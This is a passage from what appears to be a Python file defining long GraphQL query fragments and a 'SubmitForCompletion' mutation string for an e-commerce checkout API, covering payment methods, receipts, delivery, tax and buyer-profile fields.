__typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on 